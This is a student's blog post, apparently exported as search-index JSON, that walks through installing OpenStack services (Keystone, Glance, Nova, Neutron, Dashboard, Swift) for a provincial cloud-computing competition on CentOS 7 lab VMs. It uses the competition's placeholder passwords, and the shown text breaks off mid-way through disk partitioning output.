[{"categories":["operations and maintenance"],"content":"A note of my attempting.","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Introduction As you know, I have been fortunate enough to be selected by my instructors to participate in the provincial cloud computing competition. As a result, I have joined the project group in campus. As a member of the group, I need to study hard and continuously expand my knowledge. To achieve good results at the upcoming provincial competition, we need to learn about the structure of private clouds and the different types of container clouds. One suggested option for a private cloud solution is OpenStack, which can be complex and require significant effort to master. However, I am still motivated to pursue this technology as I have a strong interest in IT and Linux-related topics, and I believe that the challenge of learning OpenStack will ultimately improve my knowledge and skills. Therefore, I made a decision to write some articles on my blog site to document my study process. ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:1:0","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Preparation ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:2:0","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Nodes At first of the first, I need to understand a basic example structrue of the OpenStack. Without doubt, this picture below is a reasonable and official one. However, limited by the performance and small disk storage, I can only create mainly 2 nodes and an extra resource node to provide the images and repos. I won’t create independent Object Storage Node and Block Storage Node while it’s a better choice to add 2 extra virtual disks to the Compute Node. And for the Cinder Service, I will only provide 1 disk with 2 partitions to run the service. The details of my VirutalBox properties is blow: By the way, I have to explain the Arch VM, it’s only a resource node to provide the HTTP downloading and yum repo service. So I just use 256MB RAM and 1 core, but 2 disks to storage the multiple and large repo files. ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:2:1","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Network Network Interfaces In order to set up the OpenStack Services, each node (compute and controller) need to use 2 network interfaces. The first one is used to connect to the Management NetWork while the second one is used to connect the Operation Network. Network Interface Network Usage enp0s3 192.168.56.0/24 Management NetWork enp0s8 172.129.1.0/24 Operation Network Nodes IP Address So the detail netowrk properties is below: Node Management Address Operation Address controller 192.168.56.2 172.129.1.1 compute 192.168.56.3 172.129.1.2 Resource 192.168.56.100 None ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:2:2","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Operating System CentOS will be installed in the controller and compute and the Arch Linux will be installed in Resouce. Node OS controller CentOS 7 compute CentOS 7 Resource Arch Linux Set up the network Edit the file /etc/sysconfig/network-scripts/ifcfg-enp0s3 and /etc/sysconfig/network-scripts/ifcfg-enp0s8 on each nodes. # vim /etc/sysconfig/network-scripts/ifcfg-enp0s3 # vim /etc/sysconfig/network-scripts/ifcfg-enp0s8 And Edit the file according to the sheet. For example, the controller node is below: /etc/sysconfig/network-scripts/ifcfg-enp0s3: TYPE=Ethernet PROXY_METHOD=none BROWSER_ONLY=no BOOTPROTO=static DEFROUTE=yes IPADDR=192.168.56.2 GATEWAY=192.168.56.1 PREFIX=24 IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=enp0s3 UUID=d59932b3-b22e-4d55-893d-cdeb847bd619 DEVICE=enp0s3 ONBOOT=yes /etc/sysconfig/network-scripts/ifcfg-enp0s8: TYPE=Ethernet PROXY_METHOD=none BROWSER_ONLY=no BOOTPROTO=static DEFROUTE=yes IPADDR=172.129.1.1 PREFIX=24 IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=enp0s8 UUID=b02be511-361b-447f-b670-282850bce1f5 DEVICE=enp0s8 ONBOOT=yes Start ssh service Start sshd on each nodes. # systemctl start sshd \u0026\u0026 systemctl enable sshd ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:2:3","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"Quiz ","date":"2023-05-04","objectID":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/:3:0","tags":["OpenStack","Linux","CentOS","Competition","Installation","Notes","Attempt","operations and maintenance","Keystone","Glance","Placement","Nova","Neutron","Swift","Cinder","Manila"],"title":"Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)","uri":"/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/"},{"categories":["operations and maintenance"],"content":"[Task 1] Building Private Cloud Services [10.5 points] [Question 1] Basic environment configuration [0.5 points] Using the provided username and password, log in to the provided OpenStack private cloud platform. Under the current tenancy, create two virtual machines using the CentOS7.9 image and 4vCPU/12G/100G_50G type. The second network card should be created and connected to both the controller and compute nodes (the second network card’s subnet is 10.10.X.0/24, where X represents the workstation number, and no routing is needed). Verify the security group policies to ensure normal network communication and ssh connection, and configure the servers as follows: Set the hostname of the control node to ‘controller’ and that of the compute node to ‘compute’; Modify the hosts file to map IP addresses to hostnames. After completing the configuration, submit the username, password, and IP address of the control node in the answer box. The first quiz is eazy, just some steps can be done. At the controller Node: [root@controller ~]# hostnamectl set-hostname controller At the compute Node: [root@compute ~]# hostnamectl set-hostname compute Edit the file /etc/hosts: [root@controller ~]# vim /etc/hosts Write these: 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.56.100 Resource 192.168.56.2 controller 192.168.56.3 compute Save it by :wq. Then send it to compute Node by scp: [root@controller ~]# scp /etc/hosts root@compute:/etc/hosts Finally, all the operation is complete. [Question 2] Yum Repository Configuration [0.5 points] Using the provided HTTP service address, there are CentOS 7.9 and IaaS network YUM repositories available under the HTTP service. Use this HTTP source as the network source for installing the IaaS platform. Set up the yum source file http.repo for both the controller node and compute node. After completion, submit the username, password, and IP address of the control node to the answer box. Well, it’s still a easy question. First, delete the old repo files in two nodes: [root@controller ~]# rm -rfv /etc/yum.repos.d/* [root@compute ~]# rm -rfv /etc/yum.repos.d/* Second, according to the question, we should create and edit a file named after http.repo. [root@controller ~]# vim /etc/yum.repos.d/http.repo write the information below into the file: [centos] name=centos baseurl=http://Resource/centos gpgcheck=0 enabled=1 [iaas-repo] name=centos baseurl=http://Resource/iaas gpgcheck=0 enabled=1 Then save it, and do the same operation in the compute node. But there’s a quick way to use scp to copy the file to it. [root@controller ~]# scp /etc/yum.repos.d/http.repo root@compute:/etc/yum.repos.d/http.repo Then type the password of the root in compute node, the file will be sent. And of course, I will use the quick way to do the same executions. [Question 3] Configure SSH without keys [0.5 points] Configure the controller node to access the compute node without a key, and then attempt an SSH connection to the hostname of the compute node for testing. After completion, submit the username, password, and IP address of the controller node in the answer box. It’s also an easy and necessary operation we have to do, because we can make the controller node easier to transfer files and execute commands in compute node. So the first thing we have to do is generate a ssh-key: [root@controller ~]# ssh-keygen Then press the Enter to confirm your requirements of generation according to the information in terminal. Normally you will see these: Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:FYN98pz53tfocj5Q4DO90jqqN+lJdzXi9WKMFNjm4Wc root@Resource The key's randomart image is: +---[RSA 3072]----+ | oo | | . o=o | | o*== | | . +Ooo | | S +BE+.| | .+=*.o| | ..o*=oo| | .+o+o=.+| | .++o *o..| +----[SHA256]-----+ And now it’s time to put the key into the compute node! Just simply execute the ssh-copy-id: [root@controller ~]# ssh-copy-id root@compute And type the password at the last time! You needn’t enter the ssh password of the compute node anymore! Then this quiz is solved! [Question 4] Basic Installation [0.5 points] Install the openstack-iaas package on both the control node and compute node, and configure the basic variables in the script files of the two nodes according to Table 2 (the configuration script file is /etc/openstack/openrc.sh). Table 2 Cloud Platform Configuration Information Service Name Variable Parameter/Password Mysql root 000000 Keystone 000000 Glance 000000 Nova 000000 Neutron 000000 Heat 000000 Zun 000000 Keystone DOMAIN_NAME demo Admin 000000 Rabbit 000000 Glance 000000 Nova 000000 Neutron 000000 Heat 000000 Zun 000000 Neutron Metadata 000000 External Network eth1 (depending on actual situation) \u003c![if supportMisalignedColumns]\u003e \u003c![endif]\u003e So according to the Quiz, we have to install the package openstack-iaas at first: [root@controller ~]# yum install -y openstack-iaas [root@compute ~]# yum install -y openstack-iaas Then edit the file /etc/openstack/openrc.sh: [root@controller ~]# vim /etc/openstack/openrc.sh With the information provided by the tables, we can simply write them into it by using vim. ##--------------------system Config--------------------## ##Controller Server Manager IP. example:x.x.x.x #HOST_IP=192.168.56.2 ##Controller HOST Password. example:000000 #HOST_PASS=000000 ##Controller Server hostname. example:controller #HOST_NAME=controller ##Compute Node Manager IP. example:x.x.x.x #HOST_IP_NODE=192.168.56.3 ##Compute HOST Password. example:000000 #HOST_PASS_NODE=000000 ##Compute Node hostname. example:compute #HOST_NAME_NODE=compute ##--------------------Chrony Config-------------------## ##Controller network segment IP. example:x.x.0.0/16(x.x.x.0/24) #network_segment_IP=192.168.56.0/24 ...... But for all the PASS=000000 we can operate quickly by using the command. :%s/PASS=/PASS=000000/g Then you will spot that there is a # in each of the front of the variables, we need to execute this vim command to delete the first character: :%s/^.\\{1\\}// Finally, we will get a file like this: #--------------------system Config--------------------## #Controller Server Manager IP. example:x.x.x.21x HOST_IP=192.168.56.2 #Controller HOST Password. example:000000 HOST_PASS=000000 #Controller Server hostname. example:controller HOST_NAME=controller #Compute Node Manager IP. example:x.x.x.x HOST_IP_NODE=192.168.56.3 #Compute HOST Password. example:000000 HOST_PASS_NODE=000000 #Compute Node hostname. example:compute HOST_NAME_NODE=compute #--------------------Chrony Config-------------------## #Controller network segment IP. example:x.x.0.0/16(x.x.x.0/24) network_segment_IP=192.168.56.0/24 #--------------------Rabbit Config ------------------## #user for rabbit. example:openstack RABBIT_USER=openstack #Password for rabbit user .example:000000 RABBIT_PASS=000000 #--------------------MySQL Config---------------------## #Password for MySQL root user . exmaple:000000 DB_PASS=000000 #--------------------Keystone Config------------------## #Password for Keystore admin user. exmaple:000000 DOMAIN_NAME=demo ADMIN_PASS=000000 DEMO_PASS=000000 #Password for Mysql keystore user. exmaple:000000 KEYSTONE_DBPASS=000000 #--------------------Glance Config--------------------## #Password for Mysql glance user. exmaple:000000 GLANCE_DBPASS=000000 #Password for Keystore glance user. exmaple:000000 GLANCE_PASS=000000 #--------------------Placement Config----------------------## #Password for Mysql placement user. exmaple:000000 PLACEMENT_DBPASS=000000 #Password for Keystore placement user. exmaple:000000 PLACEMENT_PASS=000000 #--------------------Nova Config----------------------## #Password for Mysql nova user. exmaple:000000 NOVA_DBPASS=000000 #Password for Keystore nova user. exmaple:000000 NOVA_PASS=000000 #--------------------Neutron Config-------------------## #Password for Mysql neutron user. exmaple:000000 NEUTRON_DBPASS=000000 #Password for Keystore neutron user. exmaple:000000 NEUTRON_PASS=000000 #metadata secret for neutron. exmaple:000000 METADATA_SECRET=000000 #External Network Interface. example:eth1 INTERFACE_NAME=enp0s3 #External Network The Physical Adapter. example:provider Physical_NAME=provider1 #First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101 minvlan=101 #Last Vlan ID in VLAN RANGE for VLAN Network. example:200 maxvlan=200 #--------------------Cinder Config--------------------## #Password for Mysql cinder user. exmaple:000000 CINDER_DBPASS=000000 #Password for Keystore cinder user. exmaple:000000 CINDER_PASS=000000 #Cinder Block Disk. example:md126p3 BLOCK_DISK=sdb1 #--------------------Swift Config---------------------## #Password for Keystore swift user. exmaple:000000 SWIFT_PASS=000000 #The NODE Object Disk for Swift. example:md126p4. OBJECT_DISK=sdb2 #The NODE IP for Swift Storage Network. example:x.x.x.x. STORAGE_LOCAL_NET_IP=172.129.1.2 #--------------------Trove Config----------------------## #Password for Mysql trove user. exmaple:000000 TROVE_DBPASS=000000 #Password for Keystore trove user. exmaple:000000 TROVE_PASS=000000 #--------------------Heat Config----------------------## #Password for Mysql heat user. exmaple:000000 HEAT_DBPASS=000000 #Password for Keystore heat user. exmaple:000000 HEAT_PASS=000000 #--------------------Ceilometer Config----------------## #Password for Gnocchi ceilometer user. exmaple:000000 CEILOMETER_DBPASS=000000 #Password for Keystore ceilometer user. exmaple:000000 CEILOMETER_PASS=000000 #--------------------AODH Config----------------## #Password for Mysql AODH user. exmaple:000000 AODH_DBPASS=000000 #Password for Keystore AODH user. exmaple:000000 AODH_PASS=000000 #--------------------ZUN Config----------------## #Password for Mysql ZUN user. exmaple:000000 ZUN_DBPASS=000000 #Password for Keystore ZUN user. exmaple:000000 ZUN_PASS=000000 #Password for Keystore KURYR user. exmaple:000000 KURYR_PASS=000000 #--------------------OCTAVIA Config----------------## #Password for Mysql OCTAVIA user. exmaple:000000 OCTAVIA_DBPASS=000000 #Password for Keystore OCTAVIA user. exmaple:000000 OCTAVIA_PASS=000000 #--------------------Manila Config----------------## #Password for Mysql Manila user. exmaple:000000 MANILA_DBPASS=000000 #Password for Keystore Manila user. exmaple:000000 MANILA_PASS=000000 #The NODE Object Disk for Manila. example:md126p5. SHARE_DISK=sdc1 #--------------------Cloudkitty Config----------------## #Password for Mysql Cloudkitty user. exmaple:000000 CLOUDKITTY_DBPASS=000000 #Password for Keystore Cloudkitty user. exmaple:000000 CLOUDKITTY_PASS=000000 #--------------------Barbican Config----------------## #Password for Mysql Barbican user. exmaple:000000 BARBICAN_DBPASS=000000 #Password for Keystore Barbican user. exmaple:000000 BARBICAN_PASS=000000 And then execute the scp command to copy it to the compute node, this Quiz gonna be solved! [root@controller ~]# scp /etc/openstack/openrc.sh root@compute:/etc/openstack/openrc.sh [Question 5] Database Installation and Tuning [1.0 point] Use the iaas-install-mysql.sh script on the controller node to install services such as Mariadb, Memcached, and RabbitMQ. After installing the services, modify the /etc/my.cnf file to meet the following requirements: Set the database to support case sensitivity; Set the cache for innodb table indexes, data, and insert data buffer to 4GB; Set the database’s log buffer to 64MB; Set the size of the database’s redo log to 256MB; Set the number of redo log file groups for the database to 2. After completing the configuration, submit the username, password, and IP address of the controller node in the answer box. Before we execute the iaas-install-mysql.sh to install services, we need to run the iaas-pre-host.sh script on each nodes, in order to install some packages the services need. [root@controller ~]# cd /usr/local/bin/ [root@controller bin]# ./iaas-pre-host.sh [root@compute ~]# cd /usr/local/bin/ [root@compute bin]# ./iaas-pre-host.sh After the script finished, we need to reconnect the ssh shell or reboot the system of each nodes. Then we can do the first step, run iaas-install-mysql.sh in controller node. [root@controller bin]# ./iaas-install-mysql.sh And we edit the file /etc/my.cnf. [root@controller bin]# vim /etc/my.cnf Add these properties into it: lower_case_table_names = 1 innodb_buffer_pool_size = 4G innodb_log_buffer_size = 64M innodb_log_file_size = 256M innodb_log_files_in_group = 2 Make sure your file look like this: # # This group is read both both by the client and the server # use it for options that affect everything # [client-server] # # This group is read by the server # [mysqld] # Disabling symbolic-links is recommended to prevent assorted security risks lower_case_table_names = 1 innodb_buffer_pool_size = 4G innodb_log_buffer_size = 64M innodb_log_file_size = 256M innodb_log_files_in_group = 2 symbolic-links=0 default-storage-engine = innodb innodb_file_per_table collation-server = utf8_general_ci init-connect = 'SET NAMES utf8' character-set-server = utf8 max_connections=10000 default-storage-engine = innodb innodb_file_per_table collation-server = utf8_general_ci init-connect = 'SET NAMES utf8' character-set-server = utf8 max_connections=10000 # # include all files from the config directory # !includedir /etc/my.cnf.d Finally we Save it. :wq The quiz was sovled! [Question 6] Keystone Service Installation and Usage [0.5 points] Use the iaas-install-keystone.sh script on the controller node to install the Keystone service. After installation, use the relevant commands to create a user named chinaskill with the password 000000. Upon completion, submit the username, password, and IP address of the controller node in the answer box. To install the Keystone service, we need to run the iaas-install-keystone.sh script: [root@controller bin]# ./iaas-install-keystone.sh If the installation is successful, the information backed should be like: ...... Complete! Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service. +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Default Domain | | enabled | True | | id | ff38535aa995441d8641b24d86881583 | | name | demo | | options | {} | | tags | [] | +-------------+----------------------------------+ +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Admin project | | domain_id | ff38535aa995441d8641b24d86881583 | | enabled | True | | id | b0787807ee924b179cc02799bc595d38 | | is_domain | False | | name | myadmin | | options | {} | | parent_id | ff38535aa995441d8641b24d86881583 | | tags | [] | +-------------+----------------------------------+ +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | domain_id | ff38535aa995441d8641b24d86881583 | | enabled | True | | id | 7b4df65fc3ac4d4e8a764c74f0178153 | | name | myadmin | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Service Project | | domain_id | ff38535aa995441d8641b24d86881583 | | enabled | True | | id | 4eca281ad75c45669f8b178f0d26944d | | is_domain | False | | name | service | | options | {} | | parent_id | ff38535aa995441d8641b24d86881583 | | tags | [] | +-------------+----------------------------------+ +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Demo Project | | domain_id | ff38535aa995441d8641b24d86881583 | | enabled | True | | id | 1256dce1e4c843b99cf50e0739308313 | | is_domain | False | | name | demo | | options | {} | | parent_id | ff38535aa995441d8641b24d86881583 | | tags | [] | +-------------+----------------------------------+ +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | domain_id | ff38535aa995441d8641b24d86881583 | | enabled | True | | id | c9f1413519a84c8ba0f9efd4d3f8d728 | | name | demo | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | None | | domain_id | None | | id | 7ad524a1308d4089a01347dbf09d2044 | | name | user | | options | {} | +-------------+----------------------------------+ +------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | expires | 2023-05-05T14:51:32+0000 | | id | gAAAAABkVQnk9i7FQoKaw9VKNqZuEbVOmoaE-bCPPYlEy-kBqZyxOmk9o3PKLt6IxyCnfU9jO_dvd7yMpGl9LuhaXqiFHycPiIUSCoP-har-EhxmH1IUWK303DcD6jGi4GvBufnTtx7tYIIJgrA-NdMCRJu2lkSnKxCwmvI8pjz7drBwnxDl9Ps | | project_id | b0787807ee924b179cc02799bc595d38 | | user_id | 7b4df65fc3ac4d4e8a764c74f0178153 | +------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ After the installation, we need to create a user named ‘chinaskill’ according to the question. So, first we use the source command to read the variables of Keystone: [root@controller bin]# source /etc/keystone/admin-openrc.sh Then create the user by using openstack command [root@controller bin]# openstack user create --domain demo --password-prompt chinaskill Then type the password 000000, you will get these information: User Password: Repeat User Password: +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | domain_id | ff38535aa995441d8641b24d86881583 | | enabled | True | | id | 206814a5dfba4a9194701d124a815ca3 | | name | chinaskill | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ It means that you create the user successfully! And this quiz was also solved! [Question 7] Glance Installation and Usage [0.5 points] Use the iaas-install-glance.sh script on the controller node to install the glance service. Use the command to upload the provided cirros-0.3.4-x86_64-disk.img image (which is available on an HTTP service and can be downloaded independently) to the platform, name it cirros, and set the minimum required disk size for startup to 10G and the minimum required memory for startup to 1G. After completion, submit the username, password, and IP address of the controller node to the answer box. Well, it’s a little chanllenging, isn’t it? But don’t worry, we do the installation at first: [root@controller bin]# ./iaas-install-glance.sh Then we download the cirros-0.3.4-x86_64-disk.img [root@controller bin]# cd ~ [root@controller ~]# wget http://192.168.56.100/img/cirros-0.3.4-x86_64-disk.img Confirm the filename: [root@controller ~]# ls -lh total 13M -rw-------. 1 root root 1.3K May 4 16:09 anaconda-ks.cfg -rw-r--r-- 1 root root 13M Apr 27 2022 cirros-0.3.4-x86_64-disk.img Then we execute the command to upload the image: [root@controller ~]# openstack image create --disk-format qcow2 --container-format bare --min-disk 10 --min-ram 1024 --file ./cirros-0.3.4-x86_64-disk.img cirros Then you will see the result returned by terminal: +------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | checksum | ee1eca47dc88f4879d8a229cc70a07c6 | | container_format | bare | | created_at | 2023-05-05T15:01:42Z | | disk_format | qcow2 | | file | /v2/images/62102ae0-27c3-4bc1-ad87-44be814237f4/file | | id | 62102ae0-27c3-4bc1-ad87-44be814237f4 | | min_disk | 10 | | min_ram | 1024 | | name | cirros | | owner | b0787807ee924b179cc02799bc595d38 | | properties | os_hash_algo='sha512', os_hash_value='1b03ca1bc3fafe448b90583c12f367949f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bbdb2', os_hidden='False' | | protected | False | | schema | /v2/schemas/image | | size | 13287936 | | status | active | | tags | | | updated_at | 2023-05-05T15:01:42Z | | virtual_size | None | | visibility | shared | +------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ It means the operation is finished and successful! Now this quiz was solved! [Question 8] Nova Installation and Optimization [0.5 points] Use the iaas-install-placement.sh, iaas-install-nova-controller.sh, and iaas-install-nova-compute.sh scripts to install the Nova service on the controller node and compute node respectively. After installation, please modify the relevant Nova configuration files to solve the problem of virtual machine startup timeout due to long waiting time, which leads to failure to obtain IP address and error reporting. After configuring, submit the username, password, and IP address of the controller node to the answer box. We should run iaas-install-placement.sh script in controller node to install the placment service at first: [root@controller ~]# cd /usr/local/bin/ [root@controller bin]# ./iaas-install-placement.sh After installation of placement, we should run iaas-install-nova-controller.sh script to install nova service in controller node: [root@controller bin]# ./iaas-install-nova-controller.sh Then we should install nova service in compute node, but before that we should copy the public key of controller node to it. So we run: [root@compute ~]# ssh-copy-id root@controller Then run iaas-install-nova-compute.sh: [root@compute ~]# cd /usr/local/bin/ [root@compute bin]# ./iaas-install-nova-compute.sh Installed! +----+--------------+---------+------+---------+-------+------------+ | ID | Binary | Host | Zone | Status | State | Updated At | +----+--------------+---------+------+---------+-------+------------+ | 6 | nova-compute | compute | nova | enabled | up | None | +----+--------------+---------+------+---------+-------+------------+ Found 2 cell mappings. Skipping cell0 since it does not contain hosts. Getting computes from cell 'cell1': d955f2a9-ec41-4ea0-b72a-8f3c38977c2e Checking host mapping for compute host 'compute': c17f7c5c-5821-4891-b6ca-a6684b028db1 Creating host mapping for compute host 'compute': c17f7c5c-5821-4891-b6ca-a6684b028db1 Found 1 unmapped computes in cell: d955f2a9-ec41-4ea0-b72a-8f3c38977c2e Then run the check command in controller to verify if the nova service installed successfully! [root@controller bin]# source /etc/keystone/admin-openrc.sh [root@controller bin]# openstack compute service list And you will see the hostname of compute node: +----+----------------+------------+----------+---------+-------+----------------------------+ | ID | Binary | Host | Zone | Status | State | Updated At | +----+----------------+------------+----------+---------+-------+----------------------------+ | 4 | nova-conductor | controller | internal | enabled | up | 2023-05-06T03:14:27.000000 | | 5 | nova-scheduler | controller | internal | enabled | up | 2023-05-06T03:14:28.000000 | | 6 | nova-compute | compute | nova | enabled | up | 2023-05-06T03:14:25.000000 | +----+----------------+------------+----------+---------+-------+----------------------------+ Ok, now we should do the final operation, edit the file /etc/nova/nova.conf [root@controller bin]# vim /etc/nova/nova.conf Just simply change #vif_plugging_is_fatal=true to vif_plugging_is_fatal=false, but we can use vim command quickly: :%s/#vif_plugging_is_fatal=true/vif_plugging_is_fatal=false/g And save it! :wq So we solved a quiz again! Congratulations! [Question 9] Neutron Installation [0.5 points] Using the provided scripts iaas-install-neutron-controller.sh and iaas-install-neutron-compute.sh, install the neutron service on the controller and compute nodes. After completion, submit the username, password, and IP address of the control node to the answer box. This quiz is easy, just run the scripts in each nodes: [root@controller bin]# ./iaas-install-neutron-controller.sh [root@compute bin]# ./iaas-install-neutron-compute.sh Then the Neutron Service was installed successfully! Quiz Solved! [Question 10] Installation of Doshboard [0.5 points] Use the iaas-install-dashboad.sh script to install the dashboard service on the controller node. After installation, modify the Djingo data in the Dashboard to be stored in a file (this modification solves the problem of ALL-in-one snapshots not being accessible in other cloud platform dashboards). After completion, submit the username, password and IP address of the controller node to the answer box. Run iaas-install-dashboad.sh script: [root@controller bin]# ./iaas-install-dashboard.sh Edit the file /etc/openstack-dashboard/local_settings [root@controller bin]# vim /etc/openstack-dashboard/local_settings Replace SESSION_ENGINE = 'django.contrib.sessions.backends.cache' to SESSION_ENGINE = 'django.contrib.sessions.backends.file' :%s/SESSION_ENGINE = 'django.contrib.sessions.backends.cache'/SESSION_ENGINE = 'django.contrib.sessions.backends.file'/g Save the file: :wq And visit the Dashboard by browser http://192.168.56.2/dashboard You will see the login page. Login with username admin and password 000000. Then Dashboard was installed successfully. [Question 11] Swift Installation [0.5 points] Use the iaas-install-swift-controller.sh and iaas-install-swift-compute.sh scripts to install the Swift service on the control and compute nodes respectively. After installation, use a command to create a container named “examcontainer”, upload the cirros-0.3.4-x86_64-disk.img image to the “examcontainer” container, and set segment storage with a size of 10M for each segment. Once completed, submit the username, password, and IP address of the control node to the answer box. At first we need to create partitions in compute node We need to check the disks: [root@compute bin]# fdisk -l Disk /dev/sda: 53.7 GB, 53687091200 bytes, 104857600 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x000d6c03 Device Boot Start End Blocks Id System /dev/sda1 * 2048 2099199 1048576 83 Linux /dev/sda2 2099200 104857599 51379200 8e Linux LVM Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/sdc: 3221 MB, 3221225472 bytes, 6291456 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/centos-root: 48.4 GB, 48444211200 bytes, 94617600 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/centos-swap: 4160 MB, 4160749568 bytes, 8126464 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes We’ll get information below: /dev/sdb is a disk with a size of 21.5 GB and no partitions. /dev/sdc is a disk with a size of 3221 MB (3.2 GB) and no partitions. We need create 2 partitions in sdb: sdb1 and sdb2 sdb1 for cinder and sdb2 for swift. [root@compute bin]# fdisk /dev/sdb Welcome to fdisk (util-linux 2.23.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Device does not contain a recognized partition table Building a new DOS disklabel with disk identifier 0xe8f17fde. Command (m for help): n Partition type: p primary (0 primary, 0 extended, 4 free) e extended Select (default p): p Partition number (1-4, default 1): First sector (2048-41943039, default 2048): +10G Last sector, +sectors or +size{K,M,G} (20971520-41943039, default 41943039): Using default value 41943039 Partition 1 of type Linux and of size 10 GiB is set Command (m for help): n Partition type: p primary (1 primary, 0 extended, 3 free) e extended Select (default p): p Partition number (2-4, default 2): First sector (2048-41943039, default 2048): Using default value 2048 Last sector, +sectors or +size{K,M,G} (2048-20971519, default 20971519): Using default value 20971519 Partition 2 of type Linux and of size 10 GiB is set Command (m for help): p Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0xe8f17fde Device Boot Start End Blocks Id System /dev/sdb1 20971520 41943039 10485760 83 Linux /dev/sdb2 2048 